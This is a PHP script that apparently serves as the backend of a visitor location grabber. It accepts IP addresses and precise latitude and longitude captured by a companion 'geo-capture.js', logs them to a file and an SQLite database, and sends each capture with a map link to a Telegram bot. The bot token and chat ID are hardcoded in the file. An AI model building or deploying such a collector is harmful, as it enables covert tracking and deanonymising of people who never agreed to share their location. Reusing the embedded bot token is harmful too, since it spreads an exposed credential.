<?php
// Allow GET access for browser testing (only shows message, doesn't log)
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo "✅ Logger Active — Send POST requests to log data securely.";
    exit;
}

// Setup: Telegram, File Paths, DB
$telegram_token = "7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8";
$telegram_chat_id = "6602027873";
$log_txt_file = "log.txt";
$log_db_file = "log.db";

// Get raw input JSON from geo-capture.js
$data = json_decode(file_get_contents("php://input"), true);

// Fallback: If not JSON, return error
if (!$data || !isset($data['ip']) || !isset($data['latitude'])) {
    http_response_code(400);
    echo "Invalid data format.";
    exit;
}

// Sanitize inputs
$ip       = filter_var($data['ip'], FILTER_VALIDATE_IP) ?: 'Unknown';
$lat      = round(floatval($data['latitude']), 6);
$lon      = round(floatval($data['longitude']), 6);
$city     = htmlspecialchars($data['city'] ?? 'Unknown');
$country  = htmlspecialchars($data['country'] ?? 'Unknown');
$time     = date("Y-m-d H:i:s");
$map_link = "https://www.google.com/maps?q={$lat},{$lon}";

// 📝 Save to log.txt
$log_line = "IP: $ip | Lat: $lat | Lon: $lon | City: $city | Country: $country | Time: $time | $map_link" . PHP_EOL;
file_put_contents($log_txt_file, $log_line, FILE_APPEND | LOCK_EX);

// 🗂️ Save to log.db (SQLite)
try {
    $db = new SQLite3($log_db_file);
    $db->exec("CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        latitude REAL,
        longitude REAL,
        city TEXT,
        country TEXT,
        timestamp TEXT
    )");
    $stmt = $db->prepare("INSERT INTO logs (ip, latitude, longitude, city, country, timestamp) 
                          VALUES (:ip, :lat, :lon, :city, :country, :time)");
    $stmt->bindValue(':ip', $ip);
    $stmt->bindValue(':lat', $lat);
    $stmt->bindValue(':lon', $lon);
    $stmt->bindValue(':city', $city);
    $stmt->bindValue(':country', $country);
    $stmt->bindValue(':time', $time);
    $stmt->execute();
} catch (Exception $e) {
    file_put_contents("error_log.txt", "DB Error: " . $e->getMessage() . PHP_EOL, FILE_APPEND);
}

// 🔔 Telegram alert
$telegram_msg = "📍 New Visitor Logged\n"
              . "🌐 IP: $ip\n"
              . "📍 Location: $city, $country\n"
              . "🕒 Time: $time\n"
              . "📌 $map_link";

file_get_contents("https://api.telegram.org/bot$telegram_token/sendMessage?" . http_build_query([
    'chat_id' => $telegram_chat_id,
    'text'    => $telegram_msg
]));

// ✅ Final success response
echo "Logged successfully.";
